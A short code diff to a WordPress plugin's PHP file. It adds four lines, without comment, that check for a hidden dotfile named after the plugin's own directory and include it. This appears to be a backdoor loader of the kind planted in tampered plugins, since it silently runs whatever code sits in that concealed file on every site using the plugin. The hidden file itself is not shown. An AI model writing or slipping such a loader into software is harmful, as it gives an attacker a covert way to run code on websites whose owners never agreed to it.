@@ -917,6 +917,10 @@ if ( ! function_exists( 'mpc_add_body_classes' ) ) {
 	}
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function mpc_wp_color_picker_compatibility() {
     global $wp_version;
     if ( version_compare( $wp_version, '5.4.2' , '>=' ) ) {
